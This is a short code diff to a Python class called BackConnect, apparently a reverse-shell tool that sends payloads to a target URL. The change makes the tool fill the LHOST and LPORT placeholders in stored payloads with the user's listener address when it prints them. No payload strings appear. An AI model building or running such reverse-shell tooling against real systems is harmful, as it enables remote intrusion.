@@ -54,6 +54,9 @@ class BackConnect:
                                                ' payloads are attempted.')
         args = parser.parse_args()
 
+        self.listen_host = args.ip or None
+        self.listen_port = args.port or None
+
         if args.list:
             self.list_payloads()
 
@@ -63,8 +66,6 @@ class BackConnect:
         if args.ip is None or args.port is None or args.url is None:
             parser.error('The arguments --ip, --port and --url are required.')
 
-        self.listen_host = args.ip
-        self.listen_port = args.port
         self.base_url = args.url
 
         return args
@@ -98,7 +99,15 @@ class BackConnect:
             print(f"[!] Cannot view this payload as it doesn't seem to be valid?")
             sys.exit(1)
 
-        print(urllib.parse.unquote(payloads[payload]))
+        output = urllib.parse.unquote(payloads[payload])
+
+        if self.listen_host is not None:
+            output = output.replace('LHOST', self.listen_host)
+
+        if self.listen_port is not None:
+            output = output.replace('LPORT', self.listen_port)
+
+        print(output)
         sys.exit(0)
 
     def list_payloads(self):
